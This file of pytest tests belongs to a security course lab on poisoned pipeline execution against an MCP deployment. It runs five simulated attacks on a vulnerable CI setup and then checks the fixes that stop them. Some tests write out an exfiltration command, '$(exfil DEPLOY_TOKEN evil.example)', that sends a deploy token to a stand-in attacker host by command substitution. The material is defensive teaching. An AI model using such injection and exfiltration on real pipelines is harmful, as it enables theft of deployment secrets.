"""PPE against an MCP deployment: five attacks against the vulnerable pipeline, then the fixes.

All simulated. The only thing "stolen" is a canary.

Run from the repository root:
    python -m pytest cmcpse-course/ch5-devsecops-for-mcp-security/labs/ppe-mcp-deployment -v
"""

import sys
from dataclasses import replace
from pathlib import Path

import pytest

from aisec_lab import load_lab_module, make_canary

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
ci = load_lab_module(__file__, "ci_sim")
sys.modules["ci_sim"] = ci  # attacks.py imports ci_sim by name
attacks = load_lab_module(__file__, "attacks")

CANARY = make_canary("DEPLOYTOKEN")
SECRETS = {"DEPLOY_TOKEN": CANARY}
VULN_REPO = ci.base_repo(ci.VULNERABLE)
SECURE_REPO = ci.base_repo(ci.SECURE)

ATTACKS = ["direct_ppe", "indirect_makefile", "indirect_deploy_script", "config_hook", "tool_description_injection"]


def make_attack(name, repo):
    fn = getattr(attacks, name)
    return fn(repo) if name in {"direct_ppe", "tool_description_injection"} else fn()


# ------------------------------------------------------------------ the attacks work on the vulnerable setup
@pytest.mark.parametrize("name", ATTACKS)
def test_attack_steals_the_canary_from_the_vulnerable_pipeline(name):
    result = ci.run_pipeline(ci.VULNERABLE, VULN_REPO, make_attack(name, VULN_REPO), SECRETS)
    assert result.leaked(CANARY), result.log
    assert result.sink[0][0] == "evil.example"


def test_fork_pr_works_too_when_secrets_reach_pr_runs():
    pr = attacks.indirect_makefile()
    pr.from_fork = True
    assert ci.run_pipeline(ci.VULNERABLE, VULN_REPO, pr, SECRETS).leaked(CANARY)


def test_benign_change_works_on_both_platforms():
    for platform, repo in ((ci.VULNERABLE, VULN_REPO), (ci.SECURE, SECURE_REPO)):
        result = ci.run_pipeline(platform, repo, attacks.benign_change(), SECRETS)
        assert not result.failed and not result.leaked(CANARY)


# ------------------------------------------------------------------ the fixes
@pytest.mark.parametrize("name", ATTACKS)
def test_no_attack_steals_the_canary_from_the_secure_pipeline(name):
    result = ci.run_pipeline(ci.SECURE, SECURE_REPO, make_attack(name, SECURE_REPO), SECRETS)
    assert not result.leaked(CANARY), result.log


def test_direct_ppe_is_ignored_because_the_pipeline_comes_from_base():
    pr = attacks.direct_ppe(SECURE_REPO)
    result = ci.run_pipeline(ci.SECURE, SECURE_REPO, pr, SECRETS)
    assert result.sink == [] and "exfil" not in " ".join(result.log)


def test_secure_pr_runs_have_no_secrets_and_no_deploy():
    result = ci.run_pipeline(ci.SECURE, SECURE_REPO, attacks.benign_change(), SECRETS)
    assert result.deployed == [] and "deploy" in result.skipped


def test_untrusted_code_still_runs_without_secrets_in_pr_jobs():
    """Honest limit: the Makefile change still executes. It just finds nothing to steal."""
    result = ci.run_pipeline(ci.SECURE, SECURE_REPO, attacks.indirect_makefile(), SECRETS)
    assert any("BLOCKED egress" in line for line in result.log)


def test_hook_is_skipped_by_ignore_scripts():
    result = ci.run_pipeline(ci.SECURE, SECURE_REPO, attacks.config_hook(), SECRETS)
    assert "postinstall hook skipped (ignore_scripts)" in result.log


def test_description_scan_stops_the_pipeline_before_publish():
    result = ci.run_pipeline(ci.SECURE, SECURE_REPO, attacks.tool_description_injection(SECURE_REPO), SECRETS)
    assert result.failed and result.published == []
    assert any("DESC-SHELL" in line for line in result.log)


def test_env_variable_keeps_description_as_data():
    """Same text, but only the scan is disabled: the env-variable pipeline still does not execute it."""
    platform = replace(ci.SECURE)
    repo = dict(SECURE_REPO)
    repo[".ci/pipeline.yml"] = repo[".ci/pipeline.yml"].replace('run: ["scan-descriptions"]', 'run: ["echo scan disabled"]')
    pr = attacks.tool_description_injection(repo)
    result = ci.run_pipeline(platform, repo, pr, SECRETS)
    assert not result.leaked(CANARY)
    assert "$(exfil" in result.published[0]  # published as plain text, never executed


# ------------------------------------------------------------------ merge gate
@pytest.mark.parametrize("name", ATTACKS)
def test_protected_paths_block_merge_without_a_code_owner(name):
    ok, why = ci.merge_allowed(ci.SECURE, make_attack(name, SECURE_REPO))
    assert not ok and "code owner" in why


def test_code_owner_approval_allows_merge_but_author_cannot_self_approve():
    pr = attacks.indirect_makefile()
    assert ci.merge_allowed(ci.SECURE, pr, ("secops-lead",))[0]
    assert not ci.merge_allowed(ci.SECURE, pr, ("mallory",))[0]
    own = ci.PullRequest(pr.changes, author="secops-lead")
    assert not ci.merge_allowed(ci.SECURE, own, ("secops-lead",))[0]


def test_unprotected_change_merges_with_normal_review():
    assert ci.merge_allowed(ci.SECURE, attacks.benign_change())[0]


# ------------------------------------------------------------------ defence in depth after a bad merge
def post_merge_repo():
    repo = dict(SECURE_REPO)
    repo.update(attacks.indirect_deploy_script().changes)  # a malicious change slipped through review
    return repo


def test_deploy_waits_for_environment_approval():
    result = ci.run_pipeline(ci.SECURE, post_merge_repo(), None, SECRETS, event="push")
    assert result.deployed == [] and any("waiting for approval" in line for line in result.log)


def test_egress_allowlist_stops_exfiltration_even_after_a_bad_merge():
    result = ci.run_pipeline(ci.SECURE, post_merge_repo(), None, SECRETS, event="push", approved_environments=frozenset({"production"}))
    assert not result.leaked(CANARY)
    assert "BLOCKED egress to evil.example" in result.log


def test_without_egress_control_the_bad_merge_leaks_the_token():
    """Why egress allowlists and short-lived tokens matter: review is not the only layer."""
    open_net = replace(ci.SECURE, egress_allowlist=None)
    result = ci.run_pipeline(open_net, post_merge_repo(), None, SECRETS, event="push", approved_environments=frozenset({"production"}))
    assert result.leaked(CANARY)


# ------------------------------------------------------------------ shell behaviour that makes the lab honest
def test_shell_command_substitution_runs_inner_command_once():
    result = ci.RunResult()
    shell = ci.FakeShell({}, {"DEPLOY_TOKEN": CANARY}, result, ci.VULNERABLE)
    shell.run_line('echo "hello $(exfil DEPLOY_TOKEN evil.example)"')
    assert result.leaked(CANARY)


def test_variable_content_is_not_re_parsed():
    result = ci.RunResult()
    shell = ci.FakeShell({}, {"DEPLOY_TOKEN": CANARY, "X": "$(exfil DEPLOY_TOKEN evil.example)"}, result, ci.VULNERABLE)
    shell.run_line('echo "$X"')
    assert result.sink == [] and result.log == ["$(exfil DEPLOY_TOKEN evil.example)"]
